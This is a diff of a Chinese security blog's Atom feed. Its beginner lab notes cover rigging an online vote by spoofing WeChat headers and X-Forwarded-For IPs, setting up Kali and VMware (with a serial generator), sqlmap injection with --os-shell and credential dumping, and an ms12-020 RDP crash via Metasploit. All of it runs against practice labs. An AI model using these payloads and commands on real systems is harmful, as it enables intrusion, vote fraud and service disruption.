@@ -6,7 +6,7 @@
   <link href="http://emptybottle.xyz/atom.xml" rel="self"/>
   
   <link href="http://emptybottle.xyz/"/>
-  <updated>2021-06-10T08:48:16.052Z</updated>
+  <updated>2022-05-17T07:03:54.248Z</updated>
   <id>http://emptybottle.xyz/</id>
   
   <author>
@@ -21,28 +21,28 @@
     <link href="http://emptybottle.xyz/2021/06/10/%E6%8A%95%E7%A5%A8%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
     <id>http://emptybottle.xyz/2021/06/10/%E6%8A%95%E7%A5%A8%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/</id>
     <published>2021-06-10T08:32:00.000Z</published>
-    <updated>2021-06-10T08:48:16.052Z</updated>
+    <updated>2022-05-17T07:03:54.248Z</updated>
     
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="这次的这个为网上的一个靶场"><a href="#这次的这个为网上的一个靶场" class="headerlink" title="这次的这个为网上的一个靶场"></a>这次的这个为网上的一个靶场</h2><a id="more"></a><p>如下图 a2015为第一名 a2019为第四名 一个微信只可投一票，请将a2019淦成第一名<br> <img src="https://img-blog.csdnimg.cn/20210610164454885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="1-点击a2019投票，用burp抓包。"><a href="#1-点击a2019投票，用burp抓包。" class="headerlink" title="1:点击a2019投票，用burp抓包。###"></a>1:点击a2019投票，用burp抓包。###</h3><p> <img src="https://img-blog.csdnimg.cn/20210610164327860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="2-改user-agent-，因为这是微信投票-所有改为微信的头"><a href="#2-改user-agent-，因为这是微信投票-所有改为微信的头" class="headerlink" title="2.改user-agent ，因为这是微信投票 所有改为微信的头"></a>2.改user-agent ，因为这是微信投票 所有改为微信的头</h3><p>Mozilla/5.0 (Linux; U; Android 4.3; zh-cn; SCH-I939D Build/JSS15J) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.4 TBS/025469 Mobile Safari/533.1 MicroMessenger/6.2.5.51_rfe7d7c5.621 NetType/3G+ Language/zh_CN</p><p>改X-Forwarded-For:IP<br> <img src="https://img-blog.csdnimg.cn/20210610164327901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="3-ctrl-l-或右击-X-Forwarded-For-后的IP选中用字典改变IP跑字典"><a href="#3-ctrl-l-或右击-X-Forwarded-For-后的IP选中用字典改变IP跑字典" class="headerlink" title="3.ctrl+l  或右击  X-Forwarded-For:后的IP选中用字典改变IP跑字典"></a>3.ctrl+l  或右击  X-Forwarded-For:后的IP选中用字典改变IP跑字典</h3><p> <img src="https://img-blog.csdnimg.cn/20210610164327901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="4-payloads选字典-跑"><a href="#4-payloads选字典-跑" class="headerlink" title="4.payloads选字典 跑"></a>4.payloads选字典 跑</h3><p> <img src="https://img-blog.csdnimg.cn/20210610164327935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="5-等字典跑完"><a href="#5-等字典跑完" class="headerlink" title="5.等字典跑完"></a>5.等字典跑完</h3><p> <img src="https://img-blog.csdnimg.cn/20210610164327892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="6-刷新网页"><a href="#6-刷新网页" class="headerlink" title="6.刷新网页"></a>6.刷新网页</h3><p><img src="https://img-blog.csdnimg.cn/20210610164327898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>即可看到a2019为第一名 增加了401票 （127.0.0.1+字典跑的400次）</p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;这次的这个为网上的一个靶场&quot;&gt;&lt;a href=&quot;#这次的这个为网上的一个靶场&quot; class=&quot;headerlink&quot; title=&quot;这次的这个为网上的一个靶场&quot;&gt;&lt;/a&gt;这次的这个为网上的一个靶场&lt;/h2&gt;</summary>
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这次的这个为网上的一个靶场</p><a id="more"></a><p>如下图 a2015为第一名 a2019为第四名 一个微信只可投一票，请将a2019淦成第一名<br> <img src="https://img-blog.csdnimg.cn/20210610164454885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="1-点击a2019投票，用burp抓包。"><a href="#1-点击a2019投票，用burp抓包。" class="headerlink" title="1:点击a2019投票，用burp抓包。###"></a>1:点击a2019投票，用burp抓包。###</h3><p> <img src="https://img-blog.csdnimg.cn/20210610164327860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="2-改user-agent-，因为这是微信投票-所有改为微信的头"><a href="#2-改user-agent-，因为这是微信投票-所有改为微信的头" class="headerlink" title="2.改user-agent ，因为这是微信投票 所有改为微信的头"></a>2.改user-agent ，因为这是微信投票 所有改为微信的头</h3><p>Mozilla/5.0 (Linux; U; Android 4.3; zh-cn; SCH-I939D Build/JSS15J) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.4 TBS/025469 Mobile Safari/533.1 MicroMessenger/6.2.5.51_rfe7d7c5.621 NetType/3G+ Language/zh_CN</p><p>改X-Forwarded-For:IP<br> <img src="https://img-blog.csdnimg.cn/20210610164327901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="3-ctrl-l-或右击-X-Forwarded-For-后的IP选中用字典改变IP跑字典"><a href="#3-ctrl-l-或右击-X-Forwarded-For-后的IP选中用字典改变IP跑字典" class="headerlink" title="3.ctrl+l  或右击  X-Forwarded-For:后的IP选中用字典改变IP跑字典"></a>3.ctrl+l  或右击  X-Forwarded-For:后的IP选中用字典改变IP跑字典</h3><p> <img src="https://img-blog.csdnimg.cn/20210610164327901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="4-payloads选字典-跑"><a href="#4-payloads选字典-跑" class="headerlink" title="4.payloads选字典 跑"></a>4.payloads选字典 跑</h3><p> <img src="https://img-blog.csdnimg.cn/20210610164327935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="5-等字典跑完"><a href="#5-等字典跑完" class="headerlink" title="5.等字典跑完"></a>5.等字典跑完</h3><p> <img src="https://img-blog.csdnimg.cn/20210610164327892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="6-刷新网页"><a href="#6-刷新网页" class="headerlink" title="6.刷新网页"></a>6.刷新网页</h3><p><img src="https://img-blog.csdnimg.cn/20210610164327898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>即可看到a2019为第一名 增加了401票 （127.0.0.1+字典跑的400次）</p>]]></content>
     
     
+    <summary type="html">&lt;p&gt;这次的这个为网上的一个靶场&lt;/p&gt;</summary>
     
     
-    <category term="工具" scheme="http://emptybottle.xyz/tags/%E5%B7%A5%E5%85%B7/"/>
     
-    <category term="投票" scheme="http://emptybottle.xyz/tags/%E6%8A%95%E7%A5%A8/"/>
+    <category term="笔记" scheme="http://emptybottle.xyz/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+    <category term="笔记" scheme="http://emptybottle.xyz/tags/%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
   <entry>
-    <title>信息收集</title>
+    <title>kali搭建教程</title>
     <link href="http://emptybottle.xyz/2021/05/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
     <id>http://emptybottle.xyz/2021/05/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
-    <published>2021-05-10T03:12:11.000Z</published>
-    <updated>2021-06-10T08:52:05.612Z</updated>
+    <published>2021-05-10T03:12:00.000Z</published>
+    <updated>2022-05-17T07:09:30.941Z</updated>
     
     <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>百度VMware官网下载解压包</p><a id="more"></a>，不过下载的比较慢安装包我百度网盘在下面分享<p>链接：<a href="https://pan.baidu.com/s/1ydpHq-KroaBm9KYtVIng2A">https://pan.baidu.com/s/1ydpHq-KroaBm9KYtVIng2A</a><br>提取码：1zqt<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p><p>复制然后打开百度网盘下载<br> <img src="https://img-blog.csdnimg.cn/2021050810411188.png" alt="在这里插入图片描述"><br>解压出来有这个安装包点击直接根据提示下一步<br>然后一直下一步就行<br> <img src="https://img-blog.csdnimg.cn/20210508104136843.png" alt="在这里插入图片描述"></p><p>点击这个是生成序列号的软件<br>双击打开复制序列号就行，到这里VMware就安装完成啦<br><img src="https://img-blog.csdnimg.cn/20210508104152893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后双击打开图中文件就是VMware</p><p>接下来下面是在VMware里面安装kali Linux<br>点击创建新的虚拟机<br> <img src="https://img-blog.csdnimg.cn/20210508104203955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后会出来如图，选择典型根据提示下一步</p><p> <img src="https://img-blog.csdnimg.cn/20210508104216604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后下一步</p><p> <img src="https://img-blog.csdnimg.cn/20210508104226893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这里选择Linux根据如图提示继续下一步<br><img src="https://img-blog.csdnimg.cn/20210508104235638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>虚拟机名称自己随便起，位置看自己想放哪点击浏览选择位置，然后继续下一步<br> <img src="https://img-blog.csdnimg.cn/20210508104247865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后默认点击下一步就行</p><p><img src="https://img-blog.csdnimg.cn/20210508104301557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>点击自定义硬件<br> <img src="https://img-blog.csdnimg.cn/20210508104319334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后出来如图点击浏览找到下载的kali镜像ios<br><img src="https://img-blog.csdnimg.cn/20210508104339519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后点击下面关闭 完成就OK</p><p>然后接下来点击开启此虚拟机<br>出现如图点击选择第一个graphical install模式确定<br>有的可能顺序不同找graphical install模式就行</p><p> <img src="https://img-blog.csdnimg.cn/20210508104357908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后根据提示选择语言按确认<br> <img src="https://img-blog.csdnimg.cn/20210508104403989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>语言选择好到这安装组件<br> <img src="https://img-blog.csdnimg.cn/20210508104410742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>接下来主机名随便自己想填什么填什么<br> <img src="https://img-blog.csdnimg.cn/20210508104417188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>接下来是配置网络域名，可以空白看自己<br> <img src="https://img-blog.csdnimg.cn/20210508104424631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>接下来是用户名和密码根据自身写吧千万要记住<br>记住记住！！！！！密码一定要记住后面登录kali要用后几步图片省略</p><p>密码账号好之后磁盘看自己这里推荐选择第一个。<br> <img src="https://img-blog.csdnimg.cn/20210508104433298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210508104449665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后确定，这里出现问题应该较多。要是提示其他的话就找上一步的问题<br> <img src="https://img-blog.csdnimg.cn/20210508104457231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>接下来选择是继续下一步<br> <img src="https://img-blog.csdnimg.cn/20210508104502928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这里继续下一步就行这里不填也可以自己随便填，继续之后等待时间较长<br> <img src="https://img-blog.csdnimg.cn/20210508104514612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>继续下一步就行</p><p> <img src="https://img-blog.csdnimg.cn/20210508104519719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这里根据自己需要选择工具，xfce是一定要选<br> <img src="https://img-blog.csdnimg.cn/20210508104527925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
     
@@ -51,6 +51,10 @@
     
     
     
+    <category term="环境" scheme="http://emptybottle.xyz/categories/%E7%8E%AF%E5%A2%83/"/>
+    
+    
+    <category term="kali" scheme="http://emptybottle.xyz/tags/kali/"/>
     
   </entry>
   
@@ -58,8 +62,8 @@
     <title>sqlmap</title>
     <link href="http://emptybottle.xyz/2021/04/09/qlmap/"/>
     <id>http://emptybottle.xyz/2021/04/09/qlmap/</id>
-    <published>2021-04-09T11:31:30.000Z</published>
-    <updated>2021-04-09T11:32:16.000Z</updated>
+    <published>2021-04-09T11:31:00.000Z</published>
+    <updated>2022-05-15T13:08:51.701Z</updated>
     
     <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Sqlmap自动化测试</p><a id="more"></a><p>实验网址<a href="http://192.168.19.130/sqli-labs/Less-8/?id=1">http://192.168.19.130/sqli-labs/Less-8/?id=1</a></p><p>Sqlmap:自动化测试sql注入工具<br>sqlmap -u ‘url’<br>–dbs 查询库名<br>-D 指定库<br>–table 查询表<br>-T 指定表<br>–column 查询字段<br>-C 指定字段<br>–dumps 读取数据</p><p>sqlmap：  –batch自动全部选择yes     level扫描等级</p><p>3.sqlmap -r “/root/桌面/sql-20.txt” –batch –cookie=”uname=admin” –level 3</p><p>cookie注入提权:<br>1.先用burp抓包有cookie注入<br>2。保存为文件<br>3.sqlmap -r “/root/桌面/sql-20.txt” –cookie=”id=1” –level 3<br>4.sqlmap -r “/root/桌面/sql-20.txt” –cookie=”id=1” –level 3 –os-shell</p><p>less-18-ua头注入<br>payload：<br>    ‘and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ‘</p><p>先写出所有指令，具体步骤紧跟后面附图<br>1.sqlmap -u “<a href="http://192.168.19.130/sqli-labs/Less-8/?id=1%E2%80%9D">http://192.168.19.130/sqli-labs/Less-8/?id=1”</a><br>2.sqlmap -u “<a href="http://192.168.19.130/sqli-labs/Less-8/?id=1%E2%80%9D%E2%80%94dbs">http://192.168.19.130/sqli-labs/Less-8/?id=1”—dbs</a><br>3.sqlmap -u “<a href="http://192.168.19.130/sqli-labs/Less-8/?id=1%E2%80%9D-D">http://192.168.19.130/sqli-labs/Less-8/?id=1”-D</a> information_schema –column<br>4.<br>1sqlmap -u “<a href="http://192.168.19.130/sqli-labs/Less-8/?id=1%E2%80%9D">http://192.168.19.130/sqli-labs/Less-8/?id=1”</a><br><img src="https://img-blog.csdnimg.cn/20210409192811129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>//测出布尔型盲注和时间型盲注<br>2 sqlmap -u “<a href="http://192.168.19.130/sqli-labs/Less-8/?id=1%E2%80%9D%E2%80%94dbs">http://192.168.19.130/sqli-labs/Less-8/?id=1”—dbs</a>  //列出所有数据库<br><img src="https://img-blog.csdnimg.cn/20210409192821460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3 sqlmap -u “<a href="http://192.168.19.130/sqli-labs/Less-8/?id=1%E2%80%9D-D">http://192.168.19.130/sqli-labs/Less-8/?id=1”-D</a> mysql –-tables//查询mysql中表<br><img src="https://img-blog.csdnimg.cn/20210409192831193.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4 sqlmap -u “<a href="http://192.168.19.130/sqli-labs/Less-8/?id=1%E2%80%9D-D">http://192.168.19.130/sqli-labs/Less-8/?id=1”-D</a> mysql –T user –-columns//查询user表中的字段<br><img src="https://img-blog.csdnimg.cn/20210409192840725.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>sqlmap -u “<a href="http://192.168.19.130/sqli-labs/Less-8/?id=1%E2%80%9D-D">http://192.168.19.130/sqli-labs/Less-8/?id=1”-D</a> mysql –T user –C user –-dump//查询user字段中的数据<br><img src="https://img-blog.csdnimg.cn/20210409192848875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>sqlmap -u “<a href="http://192.168.19.130/sqli-labs/Less-8/?id=1%E2%80%9D-D">http://192.168.19.130/sqli-labs/Less-8/?id=1”-D</a> mysql –T user –C password –-dump//查询password字段中的数据<br><img src="https://img-blog.csdnimg.cn/2021040919285844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>表中password数据就出来了 当然这是加密的百度解密就行</p>]]></content>
     
@@ -67,6 +71,8 @@
     <summary type="html">&lt;p&gt;Sqlmap自动化测试&lt;/p&gt;</summary>
     
     
+    
+    <category term="工具" scheme="http://emptybottle.xyz/categories/%E5%B7%A5%E5%85%B7/"/>
     
     
   </entry>
@@ -76,7 +82,7 @@
     <link href="http://emptybottle.xyz/2021/04/09/in8%E8%93%9D%E5%B1%8F-%EF%BC%8CKali%E5%A4%8D%E7%8E%B0cve-2019-0708/"/>
     <id>http://emptybottle.xyz/2021/04/09/in8%E8%93%9D%E5%B1%8F-%EF%BC%8CKali%E5%A4%8D%E7%8E%B0cve-2019-0708/</id>
     <published>2021-04-09T10:09:00.000Z</published>
-    <updated>2021-04-09T10:11:44.000Z</updated>
+    <updated>2022-05-15T13:09:13.590Z</updated>
     
     <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>ms12-020(死亡蓝屏)漏洞复现</p><a id="more"></a><p><strong>漏洞全称：</strong><br>Microsoft windows远程桌面协议RDP远程代码执行漏洞</p><p><strong>漏洞成因：</strong><br>Windows在处理某些对象时存在错误，可通过特制的RDP（远程显示协议，提供了客户与服务器之间的连接）报文访问未初始化或已删除的对象，从而导致任意代码执行。</p><p><strong>漏洞危害：</strong><br>攻击者可以利用此漏洞在目标主机上执行任意代码，甚至安装软件、更改或删除数据，或者创建拥有管理员权限的新用户，从而控制整个系统。</p><p><strong>实验环境 ：</strong><br>攻击机：kali linux  192.168.48.129<br>靶机：windows server 2008 R2  192.168.48.151<br>注意：目标需开放3389端口，且与攻击机处于同一网段，靶机未安装ms12-020漏洞补丁</p><p><strong>漏洞复现：</strong><br>*用Nmap或masscan扫描靶机端口<br> <img src="https://img-blog.csdnimg.cn/20210409180448659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="nmap扫描开放端口"></p><p>3389已开放<br>*启动msfconsole，查找ms12-020漏洞模块<br> <img src="https://img-blog.csdnimg.cn/20210409180522127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="启动攻击模块"></p><p>*调用攻击模块<br>auxiliary/dos/windows/rdp/ms12_020_maxchannelids为攻击模块<br> <img src="https://img-blog.csdnimg.cn/20210409180601240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="攻击模块的配置"></p><p>Show options（查看需要配置的参数）<br>这里我们只需要设置RHOSTS（远程地址）<br>*设置payload<br> <img src="https://img-blog.csdnimg.cn/20210409180642582.png" alt="攻击的目标IP"></p><p>然后run一下<br> <img src="https://img-blog.csdnimg.cn/20210409180720887.png" alt="运行"></p><p>此时，目标主机已经蓝屏<br> <img src="https://img-blog.csdnimg.cn/20210409180747136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MzIyMzQz,size_16,color_FFFFFF,t_70" alt="目标主机蓝屏，攻击成功"></p>]]></content>
     
@@ -85,7 +91,7 @@
     
     
     
-    <category term="kali攻击利用" scheme="http://emptybottle.xyz/categories/kali%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/"/>
+    <category term="笔记" scheme="http://emptybottle.xyz/categories/%E7%AC%94%E8%AE%B0/"/>
     
     
   </entry>
@@ -95,7 +101,7 @@
     <link href="http://emptybottle.xyz/2021/04/09/%E8%A7%81%E7%9A%84%E5%A8%81%E8%83%81%E7%AB%AF%E5%8F%A3/"/>
     <id>http://emptybottle.xyz/2021/04/09/%E8%A7%81%E7%9A%84%E5%A8%81%E8%83%81%E7%AB%AF%E5%8F%A3/</id>
     <published>2021-04-09T07:34:00.000Z</published>
-    <updated>2021-04-09T07:35:12.000Z</updated>
+    <updated>2022-05-15T13:07:43.208Z</updated>
     
